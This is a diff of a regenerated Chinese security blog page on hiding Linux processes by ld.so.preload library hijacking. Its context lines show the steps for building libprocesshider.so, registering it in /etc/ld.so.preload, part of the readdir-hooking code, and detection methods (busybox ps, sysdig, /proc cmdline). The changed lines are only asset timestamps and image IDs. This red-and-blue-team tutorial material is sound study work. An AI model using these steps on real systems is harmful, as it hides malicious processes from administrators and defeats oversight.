@@ -10,18 +10,18 @@
     <title>linux隐藏进程-预加载库或lib劫持 - x7peeps</title>
     <link href="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/linux%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B-%E9%A2%84%E5%8A%A0%E8%BD%BD%E5%BA%93%E6%88%96lib%E5%8A%AB%E6%8C%81/index.xml" rel="alternate" type="application/rss+xml" title="linux隐藏进程-预加载库或lib劫持 - x7peeps"><link rel="icon" href="/images/head.png" type="image/png">
     <!-- https://github.com/filamentgroup/loadCSS/blob/master/README.md#how-to-use -->
-    <link href="/css/fontawesome-all.min.css?1691607253" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fontawesome-all.min.css?1691607253" rel="stylesheet"></noscript>
-    <link href="/css/nucleus.css?1691607253" rel="stylesheet">
-    <link href="/css/auto-complete.css?1691607253" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/auto-complete.css?1691607253" rel="stylesheet"></noscript>
-    <link href="/css/perfect-scrollbar.min.css?1691607253" rel="stylesheet">
-    <link href="/css/fonts.css?1691607253" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fonts.css?1691607253" rel="stylesheet"></noscript>
-    <link href="/css/theme.css?1691607253" rel="stylesheet">
-    <link href="/css/theme-auto.css?1691607253" rel="stylesheet" id="variant-style">
-    <link href="/css/variant.css?1691607253" rel="stylesheet">
-    <link href="/css/print.css?1691607253" rel="stylesheet" media="print">
-    <link href="/css/ie.css?1691607253" rel="stylesheet">
-    <script src="/js/url.js?1691607253"></script>
-    <script src="/js/variant.js?1691607253"></script>
+    <link href="/css/fontawesome-all.min.css?1691607312" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fontawesome-all.min.css?1691607312" rel="stylesheet"></noscript>
+    <link href="/css/nucleus.css?1691607312" rel="stylesheet">
+    <link href="/css/auto-complete.css?1691607312" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/auto-complete.css?1691607312" rel="stylesheet"></noscript>
+    <link href="/css/perfect-scrollbar.min.css?1691607312" rel="stylesheet">
+    <link href="/css/fonts.css?1691607312" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fonts.css?1691607312" rel="stylesheet"></noscript>
+    <link href="/css/theme.css?1691607312" rel="stylesheet">
+    <link href="/css/theme-auto.css?1691607312" rel="stylesheet" id="variant-style">
+    <link href="/css/variant.css?1691607312" rel="stylesheet">
+    <link href="/css/print.css?1691607312" rel="stylesheet" media="print">
+    <link href="/css/ie.css?1691607312" rel="stylesheet">
+    <script src="/js/url.js?1691607312"></script>
+    <script src="/js/variant.js?1691607312"></script>
     <script>
       // hack to let hugo tell us how to get to the root when using relativeURLs, it needs to be called *url= for it to do its magic:
       // https://github.com/gohugoio/hugo/blob/145b3fcce35fbac25c7033c91c1b7ae6d1179da8/transform/urlreplacers/absurlreplacer.go#L72
@@ -96,34 +96,34 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 parallels@ubuntu:~/Documents/libprocesshider-master$ sudo mv libprocesshider.so /usr/local/lib/
 sudo -i 进入管理员权限 
 root@ubuntu:/home/parallels/Documents/libprocesshider-master# echo /usr/local/lib/libprocesshider.so &gt;&gt; /etc/ld.so.preload</code></pre></div><p><strong>
-<a href="#image-a1eded8e47b6ed931d204ae4b8712880" class="lightbox-link">
+<a href="#image-f4e70ecc23c3cb7509f8c86dc9b43433" class="lightbox-link">
 <img src="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/linux%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B-%E9%A2%84%E5%8A%A0%E8%BD%BD%E5%BA%93%E6%88%96lib%E5%8A%AB%E6%8C%81/1624255353587-babc09ec-8357-41ac-84f5-3fc24fc1c0eb.png" alt="image.png" style="height: auto; width: auto;" loading="lazy">
 </a>
-<a href="javascript:history.back();" class="lightbox" id="image-a1eded8e47b6ed931d204ae4b8712880">
+<a href="javascript:history.back();" class="lightbox" id="image-f4e70ecc23c3cb7509f8c86dc9b43433">
 <img src="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/linux%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B-%E9%A2%84%E5%8A%A0%E8%BD%BD%E5%BA%93%E6%88%96lib%E5%8A%AB%E6%8C%81/1624255353587-babc09ec-8357-41ac-84f5-3fc24fc1c0eb.png" alt="image.png" class="lightbox-image" loading="lazy">
 </a></strong></p>
 <div class="wrap-code highlight"><pre tabindex="0"><code>echo /usr/local/lib/libprocesshider.so &gt;&gt; /etc/ld.so.preload
 cat /etc/ld.so.preload</code></pre></div><p>
-<a href="#image-8949c8c7028394e6b5a87fb2e6ae13f0" class="lightbox-link">
+<a href="#image-9c97433881ec2d661fd189e491bd580f" class="lightbox-link">
 <img src="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/linux%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B-%E9%A2%84%E5%8A%A0%E8%BD%BD%E5%BA%93%E6%88%96lib%E5%8A%AB%E6%8C%81/1624255929839-bac576f0-d14f-4276-887c-c81c64add466.png" alt="image.png" style="height: auto; width: auto;" loading="lazy">
 </a>
-<a href="javascript:history.back();" class="lightbox" id="image-8949c8c7028394e6b5a87fb2e6ae13f0">
+<a href="javascript:history.back();" class="lightbox" id="image-9c97433881ec2d661fd189e491bd580f">
 <img src="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/linux%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B-%E9%A2%84%E5%8A%A0%E8%BD%BD%E5%BA%93%E6%88%96lib%E5%8A%AB%E6%8C%81/1624255929839-bac576f0-d14f-4276-887c-c81c64add466.png" alt="image.png" class="lightbox-image" loading="lazy">
 </a></p>
 <p>测试ps是否会访问预加载，发现是加载了。</p>
 <div class="wrap-code highlight"><pre tabindex="0"><code>strace -f ps 2&gt;&amp;1 |grep ld.so.preload</code></pre></div><p><strong>
-<a href="#image-b313dd039281b5bb9d62e26b05f6c538" class="lightbox-link">
+<a href="#image-a087d0bce722b6907fa85267a840ad83" class="lightbox-link">
 <img src="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/linux%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B-%E9%A2%84%E5%8A%A0%E8%BD%BD%E5%BA%93%E6%88%96lib%E5%8A%AB%E6%8C%81/1624254619844-4d972141-b5d9-4904-abf6-ec357225572e.png" alt="image.png" style="height: auto; width: auto;" loading="lazy">
 </a>
-<a href="javascript:history.back();" class="lightbox" id="image-b313dd039281b5bb9d62e26b05f6c538">
+<a href="javascript:history.back();" class="lightbox" id="image-a087d0bce722b6907fa85267a840ad83">
 <img src="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/linux%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B-%E9%A2%84%E5%8A%A0%E8%BD%BD%E5%BA%93%E6%88%96lib%E5%8A%AB%E6%8C%81/1624254619844-4d972141-b5d9-4904-abf6-ec357225572e.png" alt="image.png" class="lightbox-image" loading="lazy">
 </a></strong></p>
 <p><strong>这里注意需要./执行evil_script.py, 进程名才会被过滤，如果想使用python执行，那么前面****processhider.c需要关键字设置为python。然后ps查询，程序名称已被过滤。</strong></p>
 <p>
-<a href="#image-369181a1a559f7268f5987388f2f24a2" class="lightbox-link">
+<a href="#image-5eb6588259a90920ec11cad3f087ee63" class="lightbox-link">
 <img src="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/linux%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B-%E9%A2%84%E5%8A%A0%E8%BD%BD%E5%BA%93%E6%88%96lib%E5%8A%AB%E6%8C%81/1624280175985-9593ccfb-a160-4379-9a86-428aa80a2207.png" alt="image.png" style="height: auto; width: auto;" loading="lazy">
 </a>
-<a href="javascript:history.back();" class="lightbox" id="image-369181a1a559f7268f5987388f2f24a2">
+<a href="javascript:history.back();" class="lightbox" id="image-5eb6588259a90920ec11cad3f087ee63">
 <img src="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/linux%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B-%E9%A2%84%E5%8A%A0%E8%BD%BD%E5%BA%93%E6%88%96lib%E5%8A%AB%E6%8C%81/1624280175985-9593ccfb-a160-4379-9a86-428aa80a2207.png" alt="image.png" class="lightbox-image" loading="lazy">
 </a></p>
 <p>当然这里也可以进行改进，我们在另外研究。如豪宝改的通过关键字检索并用于过滤进程，匹配关键字的进程隐藏。这段代码可以在这里查看更多细节 <a href="https://github.com/ghostsang/Learning-library" target="_blank">https://github.com/ghostsang/Learning-library</a></p>
@@ -261,10 +261,10 @@ struct dirent* readdir(DIR *dirp)                                       \
 DECLARE_READDIR(dirent64, readdir64);
 DECLARE_READDIR(dirent, readdir);</code></pre></div><p>这里测试含有script的过滤，evil_script.py 成功被过滤掉了。</p>
 <p>
-<a href="#image-d6d393080c41845c61d609108bf23826" class="lightbox-link">
+<a href="#image-7d8d71955f4892025a5ec7d5cc49068d" class="lightbox-link">
 <img src="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/linux%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B-%E9%A2%84%E5%8A%A0%E8%BD%BD%E5%BA%93%E6%88%96lib%E5%8A%AB%E6%8C%81/1624282662124-a538532b-4fb1-4a32-b243-c6de08a32064.png" alt="image.png" style="height: auto; width: auto;" loading="lazy">
 </a>
-<a href="javascript:history.back();" class="lightbox" id="image-d6d393080c41845c61d609108bf23826">
+<a href="javascript:history.back();" class="lightbox" id="image-7d8d71955f4892025a5ec7d5cc49068d">
 <img src="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/linux%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B-%E9%A2%84%E5%8A%A0%E8%BD%BD%E5%BA%93%E6%88%96lib%E5%8A%AB%E6%8C%81/1624282662124-a538532b-4fb1-4a32-b243-c6de08a32064.png" alt="image.png" class="lightbox-image" loading="lazy">
 </a></p>
 <p><strong>应对方式</strong></p>
@@ -273,10 +273,10 @@ DECLARE_READDIR(dirent, readdir);</code></pre></div><p>这里测试含有script�
 </ol>
 <p>busybox ps方式执行ps，可以不预加载库对于劫持lib场景有奇效。</p>
 <div class="wrap-code highlight"><pre tabindex="0"><code>busybox ps</code></pre></div><p>
-<a href="#image-e6cd76e5bfcf9ba479ae8efd7da71a54" class="lightbox-link">
+<a href="#image-6c55b98997822c83cb9fd18b8f262ece" class="lightbox-link">
 <img src="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/linux%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B-%E9%A2%84%E5%8A%A0%E8%BD%BD%E5%BA%93%E6%88%96lib%E5%8A%AB%E6%8C%81/1624289356199-f755f928-30d5-4387-8104-30730afd7e6b.png" alt="image.png" style="height: auto; width: auto;" loading="lazy">
 </a>
-<a href="javascript:history.back();" class="lightbox" id="image-e6cd76e5bfcf9ba479ae8efd7da71a54">
+<a href="javascript:history.back();" class="lightbox" id="image-6c55b98997822c83cb9fd18b8f262ece">
 <img src="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/linux%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B-%E9%A2%84%E5%8A%A0%E8%BD%BD%E5%BA%93%E6%88%96lib%E5%8A%AB%E6%8C%81/1624289356199-f755f928-30d5-4387-8104-30730afd7e6b.png" alt="image.png" class="lightbox-image" loading="lazy">
 </a></p>
 <ol>
@@ -288,27 +288,27 @@ sudo sysdig proc.name contains evil_script   # 针对包含evil_script的进程�
 # 监测网络情况
 sudo sysdig -c topprocs_net
 sudo sysdig -c topconns</code></pre></div><p>
-<a href="#image-1bcb9e645c3e37764dc5020fa5a09d2e" class="lightbox-link">
+<a href="#image-ea7bb8598376c371286daf4822ff1e06" class="lightbox-link">
 <img src="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/linux%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B-%E9%A2%84%E5%8A%A0%E8%BD%BD%E5%BA%93%E6%88%96lib%E5%8A%AB%E6%8C%81/1624292686615-1c30cb84-2212-49f7-88b8-db5df06b0d1f.png" alt="image.png" style="height: auto; width: auto;" loading="lazy">
 </a>
-<a href="javascript:history.back();" class="lightbox" id="image-1bcb9e645c3e37764dc5020fa5a09d2e">
+<a href="javascript:history.back();" class="lightbox" id="image-ea7bb8598376c371286daf4822ff1e06">
 <img src="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/linux%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B-%E9%A2%84%E5%8A%A0%E8%BD%BD%E5%BA%93%E6%88%96lib%E5%8A%AB%E6%8C%81/1624292686615-1c30cb84-2212-49f7-88b8-db5df06b0d1f.png" alt="image.png" class="lightbox-image" loading="lazy">
 </a></p>
 <p>
-<a href="#image-738e90132eff0764082f4b4f0df2783b" class="lightbox-link">
+<a href="#image-384185f1447ae2cbbe4115db90ef193e" class="lightbox-link">
 <img src="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/linux%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B-%E9%A2%84%E5%8A%A0%E8%BD%BD%E5%BA%93%E6%88%96lib%E5%8A%AB%E6%8C%81/1624292943754-e07865cc-9bcd-4e8c-80fe-fd5fc978bc2f.png" alt="image.png" style="height: auto; width: auto;" loading="lazy">
 </a>
-<a href="javascript:history.back();" class="lightbox" id="image-738e90132eff0764082f4b4f0df2783b">
+<a href="javascript:history.back();" class="lightbox" id="image-384185f1447ae2cbbe4115db90ef193e">
 <img src="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/linux%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B-%E9%A2%84%E5%8A%A0%E8%BD%BD%E5%BA%93%E6%88%96lib%E5%8A%AB%E6%8C%81/1624292943754-e07865cc-9bcd-4e8c-80fe-fd5fc978bc2f.png" alt="image.png" class="lightbox-image" loading="lazy">
 </a></p>
 <ol>
 <li>/proc/PID/cmdline</li>
 </ol>
 <p>
-<a href="#image-d27843a4c34b5c2efbb583fc5dff7774" class="lightbox-link">
+<a href="#image-55c9d3722cdf9f23414509093ea811d8" class="lightbox-link">
 <img src="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/linux%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B-%E9%A2%84%E5%8A%A0%E8%BD%BD%E5%BA%93%E6%88%96lib%E5%8A%AB%E6%8C%81/1624293441157-224ef943-2385-4608-9e40-08cfdbed1c6d.png" alt="image.png" style="height: auto; width: auto;" loading="lazy">
 </a>
-<a href="javascript:history.back();" class="lightbox" id="image-d27843a4c34b5c2efbb583fc5dff7774">
+<a href="javascript:history.back();" class="lightbox" id="image-55c9d3722cdf9f23414509093ea811d8">
 <img src="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/linux%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B-%E9%A2%84%E5%8A%A0%E8%BD%BD%E5%BA%93%E6%88%96lib%E5%8A%AB%E6%8C%81/1624293441157-224ef943-2385-4608-9e40-08cfdbed1c6d.png" alt="image.png" class="lightbox-image" loading="lazy">
 </a></p>
 
@@ -334,12 +334,12 @@ sudo sysdig -c topconns</code></pre></div><p>
         <script>
           var contentLangs=['en'];
         </script>
-        <script src="/js/auto-complete.js?1691607254" defer></script>
-        <script src="/js/lunr/lunr.min.js?1691607254" defer></script>
-        <script src="/js/lunr/lunr.stemmer.support.min.js?1691607254" defer></script>
-        <script src="/js/lunr/lunr.multi.min.js?1691607254" defer></script>
-        <script src="/js/lunr/lunr.en.min.js?1691607254" defer></script>
-        <script src="/js/search.js?1691607254" defer></script>
+        <script src="/js/auto-complete.js?1691607313" defer></script>
+        <script src="/js/lunr/lunr.min.js?1691607313" defer></script>
+        <script src="/js/lunr/lunr.stemmer.support.min.js?1691607313" defer></script>
+        <script src="/js/lunr/lunr.multi.min.js?1691607313" defer></script>
+        <script src="/js/lunr/lunr.en.min.js?1691607313" defer></script>
+        <script src="/js/search.js?1691607313" defer></script>
       </div>
       <div id="content-wrapper" class="highlightable">
         <ul class="topics enlarge morespace collapsible-menu">
@@ -533,8 +533,8 @@ sudo sysdig -c topconns</code></pre></div><p>
         </div>
       </div>
     </aside>
-    <script src="/js/clipboard.min.js?1691607254" defer></script>
-    <script src="/js/perfect-scrollbar.min.js?1691607254" defer></script>
+    <script src="/js/clipboard.min.js?1691607313" defer></script>
+    <script src="/js/perfect-scrollbar.min.js?1691607313" defer></script>
     <script>
       function useMathJax( config ){
         if( !Object.assign ){
@@ -564,15 +564,15 @@ sudo sysdig -c topconns</code></pre></div><p>
       useMathJax( JSON.parse("{}") );
     </script>
     <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
-    <script src="/js/d3/d3-color.min.js?1691607254" defer></script>
-    <script src="/js/d3/d3-dispatch.min.js?1691607254" defer></script>
-    <script src="/js/d3/d3-drag.min.js?1691607254" defer></script>
-    <script src="/js/d3/d3-ease.min.js?1691607254" defer></script>
-    <script src="/js/d3/d3-interpolate.min.js?1691607254" defer></script>
-    <script src="/js/d3/d3-selection.min.js?1691607254" defer></script>
-    <script src="/js/d3/d3-timer.min.js?1691607254" defer></script>
-    <script src="/js/d3/d3-transition.min.js?1691607254" defer></script>
-    <script src="/js/d3/d3-zoom.min.js?1691607254" defer></script>
+    <script src="/js/d3/d3-color.min.js?1691607313" defer></script>
+    <script src="/js/d3/d3-dispatch.min.js?1691607313" defer></script>
+    <script src="/js/d3/d3-drag.min.js?1691607313" defer></script>
+    <script src="/js/d3/d3-ease.min.js?1691607313" defer></script>
+    <script src="/js/d3/d3-interpolate.min.js?1691607313" defer></script>
+    <script src="/js/d3/d3-selection.min.js?1691607313" defer></script>
+    <script src="/js/d3/d3-timer.min.js?1691607313" defer></script>
+    <script src="/js/d3/d3-transition.min.js?1691607313" defer></script>
+    <script src="/js/d3/d3-zoom.min.js?1691607313" defer></script>
     <script src="https://unpkg.com/mermaid/dist/mermaid.min.js" defer></script>
     <script>
       window.themeUseMermaid = JSON.parse("{ \"theme\": \"default\" }");
@@ -581,8 +581,8 @@ sudo sysdig -c topconns</code></pre></div><p>
     <script src="https://unpkg.com/swagger-ui-dist/swagger-ui-bundle.js" defer></script>
     <script src="https://unpkg.com/swagger-ui-dist/swagger-ui-standalone-preset.js" defer></script>
     <script>
-      window.themeUseOpenapi = { css: "https://unpkg.com/swagger-ui-dist/swagger-ui.css", assetsBuster:  1691607254  };
+      window.themeUseOpenapi = { css: "https://unpkg.com/swagger-ui-dist/swagger-ui.css", assetsBuster:  1691607313  };
     </script>
-    <script src="/js/theme.js?1691607254" defer></script>
+    <script src="/js/theme.js?1691607313" defer></script>
   </body>
 </html>
